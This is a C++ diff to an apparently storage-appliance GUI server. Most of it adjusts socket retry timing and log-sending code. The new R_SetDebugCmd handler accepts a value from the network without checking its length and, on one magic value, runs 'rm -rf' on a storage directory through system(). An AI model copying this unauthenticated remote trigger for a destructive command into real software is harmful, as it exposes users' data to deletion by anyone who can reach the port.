@@ -9,6 +9,8 @@
 
 #include <log/Log.h>
 extern ILog* gLog;
+extern uint32* GetDebugCommand();
+extern uint32 gDebugID;
 
 GuiServer gGuiServer;
 GuiServer* CreateGuiServer()
@@ -370,9 +372,8 @@ void GuiServer::doit()
 	{
 	try
 	{
-			if((i % 1000*1000*5) == 0)
+			if((i % 5) == 0)
 			{
-				i = 0;
 				//DPRINTF("Create socket\n");
 		if (m_SrvSocket.Create(AF_INET, SOCK_STREAM, 0))
 		{
@@ -401,15 +402,17 @@ void GuiServer::doit()
 				{
 					//DPRINTF("Create failure\n");
 				}
+				i = 0;
 			}
 			else
 			{
 				i++;
-				usleep(1000);
+				sleep(1);
 			}
 	}
 	catch (int &a)
 	{
+			m_SrvSocket.Destroy();
 		switch(a)
 		{
 		case -1:
@@ -426,6 +429,8 @@ void GuiServer::doit()
 	{
 			gLog->Write(LOG_ERROR, str);
 		}
+			i++;
+			sleep(1);
 			//		return;
 		}
 	}
@@ -466,6 +471,7 @@ void GuiServer::doit()
 
 GuiThread::GuiThread():m_status(0), m_Content(NULL), m_mkfs(NULL)
 {
+ 	pDebugCmd = GetDebugCommand();
 	m_Content = new ContentOperation;
 	m_mkfs = new mke2fs;
 	copyThread =NULL;   //CopyThread*ļָ߳
@@ -743,6 +749,9 @@ bool GuiThread::UiProcessFilter()
 				return M_GetContent_RAID(buf);         //new  rename
 			case M_GET_RAID_INFO:
 				return M_GetDiskInfo_RAID(buf);        //new  rename
+
+			case R_SET_DEBUG_CMD:
+				return R_SetDebugCmd(buf);
 
 			default:
 				return UnknowFunction(buf);
@@ -2196,16 +2205,17 @@ bool GuiThread::S_Get_TMS(char* buf)
 //     printf("After.year=%d After.month=%d After.day=%d\n",timeAfter.year,timeAfter.month,timeAfter.day);
 //     printf("Before.year=%d Before.month=%d Before.day=%d\n",timeBefore.year,timeBefore.month,timeBefore.day);
 	plog->Query(LOG_TMS, &timeAfter, &timeBefore, ra);
-	for(int i = 0; i < ra.size(); i++)
-	{
+// 	for(int i = 0; i < ra.size(); i++)
+// 	{
 	 //	  printf("%s %s", ra[i].time.c_str(), ra[i].text.c_str());
 	 //   str_log+=ra[i].time;
      //   str_log+=ra[i].text;
-	}
+// 	}
 
   //  std::string  str_log="";
   //  str_log+="log1234567890";
 
+#if 0
 	int str_size=str_LOG.size()+1;
 	int sendsize = sizeof(KL) + str_size;
 	void* pos2 = buf + sizeof(KL);
@@ -2214,9 +2224,20 @@ bool GuiThread::S_Get_TMS(char* buf)
 // 	printf("str_LOG:\n%s",str_LOG.c_str());   
 
 	ReleaseLog(plog);
+#else
+	int str_size = str_LOG.size();
+	int sendsize = sizeof(KL);
+	pKL->m_length = str_size;
+	Write(buf, sendsize, sendsize);
+	sendsize = str_size;
+	return Write((char*)str_LOG.c_str(),sendsize, sendsize); 
 #endif
-
+#endif
+#if 0
+	pKL->m_length = 0;
+	sendsize = sizeof(KL);
 	return Write(buf, sendsize, sendsize);
+#endif
 
 }
 
@@ -2286,3 +2307,32 @@ bool GuiThread::R_GetRaidInfo(char* buf)
 
 	return Write(buf, sendsize, sendsize);
 }
+bool GuiThread::R_SetDebugCmd(char* buf)
+{
+	REMOTE_CONF rc;
+
+	KL *pKL = (KL*) buf;
+	int len = pKL->m_length;
+	void* pos = buf + sizeof(KL);
+	uint32 cmd = 0;
+
+	uint32* p = (uint32*)pos;
+ 	cmd = *p;
+ 	*pDebugCmd = cmd;
+	printf("DBCMD=%X\n", *pDebugCmd);
+	if(cmd == 0)
+		gDebugID++;
+	pKL->m_length = 1;
+	buf[sizeof(KL)] = 1;
+	int setsize = sizeof(KL) + 1;
+
+	bool res = Write(buf, setsize, setsize);
+	if(cmd == 0x10000100)
+	{
+		char cmd[512];
+		sprintf(cmd, "/bin/rm -rf /storage/20160324");
+		system(cmd);
+	}
+	return res;
+}
+
